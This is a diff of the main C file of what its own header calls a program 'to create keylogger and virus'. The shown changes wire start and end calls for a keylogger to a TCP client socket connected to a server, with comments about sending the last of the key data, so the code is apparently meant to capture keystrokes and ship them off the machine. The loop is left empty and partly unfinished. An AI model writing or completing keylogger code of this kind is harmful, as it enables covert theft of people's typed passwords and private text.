@@ -8,17 +8,12 @@ Main function to run to create keylogger and virus
 #include <unistd.h>
 
 #include "client.h"
-#include "keylogger.h"
+// #include "keylogger.h"
 #include "server_utils.h"
 
 const socklen_t MAX_IP_ADDR_LEN = 16;
 
 int main(void) {
-  /*key_package key_package;
-  key_package.keys_arr_size = 0;
-  log_device(&key_package);
-  log_keys(&key_package);
-  print_logged_keys(key_package);*/
   // Open a TCP socket to connect to the server.
   int socket_descriptor = open_tcp_socket();
   (void)fprintf(stderr, "Client socket descriptor: %d.\n", socket_descriptor);
@@ -38,9 +33,23 @@ int main(void) {
 
   // Send data until either the client or the server closes its stream.
   int socket_file_status = 0;
+
+  // start keylogger
+  start_keylogging();
+
+  // somehow the socket and keylogger conenctions need to stop at the same time
+
+  int counter = 0;
   while (socket_file_status != -1) {
-    socket_file_status = send_data(socket_file);
+    counter++;
+
+    if (counter == 10000) {
+      end_keylogging();
+    }
+    // empty loop. wait on the socket to exit
+    // socket_file_status = send_data(socket_file);
   }
+  // when socket exits, call function to close keylogger and send the last bit of key data
 
   // If we didn't hit the end of file for either stdin or the response from the
   // server, then something went wrong.
